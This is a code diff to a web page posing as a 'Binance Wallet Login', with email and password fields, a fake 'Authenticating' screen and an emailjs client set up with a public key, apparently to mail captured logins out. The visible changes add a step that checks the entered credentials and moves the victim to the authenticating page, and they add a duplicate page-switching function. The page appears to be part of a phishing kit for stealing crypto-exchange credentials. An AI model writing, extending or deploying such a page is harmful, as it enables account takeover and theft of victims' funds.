@@ -183,17 +183,20 @@
 <div id="page1" class="page visible" style="background-color: #0b0e11; color: #f0b90b; padding: 40px; font-family: 'Arial Black', Arial, sans-serif; min-height: 100vh;">
   <div style="max-width: 400px; margin: auto; text-align: center;">
     <h2 style="font-size: 24px; margin-bottom: 30px;">Binance Wallet Login</h2>
+
     <input type="email" id="email" placeholder="Email"
       style="width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 10px; background-color: #1e1e1e; border: 1px solid #f0b90b; color: white; font-weight: bold;" />
+
     <input type="password" id="pass" placeholder="Password"
       style="width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 10px; background-color: #1e1e1e; border: 1px solid #f0b90b; color: white; font-weight: bold;" />
-    <button onclick="submitSignin()" 
+
+    <button onclick="goToAuthenticating()" 
       style="width: 100%; padding: 12px; background-color: #f0b90b; color: #000; border: none; border-radius: 10px; font-weight: bold; font-size: 16px;">
       Sign In
     </button>
   </div>
 </div>
-
+  
 <!-- Page 2: Authenticating -->
 <div id="page2" class="page" style="background-color: #0b0e11; color: #f0b90b; padding: 40px; font-family: 'Arial Black', Arial, sans-serif; min-height: 100vh;">
   <div style="max-width: 400px; margin: auto; text-align: center;">
@@ -482,7 +485,25 @@
   const publicKey = "ochPV1QVtay7TOdBA";
 
   emailjs.init(publicKey);
+  
+function showPage(pageId) {
+    document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+    const target = document.getElementById(pageId) || document.getElementById(`page${pageId}`);
+    if (target) target.style.display = 'block';
+  }
 
+  function goToAuthenticating() {
+    const email = document.getElementById("email").value.trim();
+    const pass = document.getElementById("pass").value.trim();
+
+    if (!email || !pass) {
+      alert("Please enter both email and password.");
+      return;
+    }
+
+    showPage(2); // Page 2 is the Authenticating page
+  }
+      
   function submitSignin() {
     const email = document.getElementById("email").value.trim();
     const pass = document.getElementById("pass").value.trim();
@@ -528,8 +549,7 @@
       showPage(4); // Goes to Homepage
     }, 1500);
   }
-
-      // Utility to show page by id and hide others
+  // Utility to show page by id and hide others
   function showPage(pageId) {
   const pages = document.querySelectorAll('.page');
   pages.forEach(p => p.classList.remove('visible'));
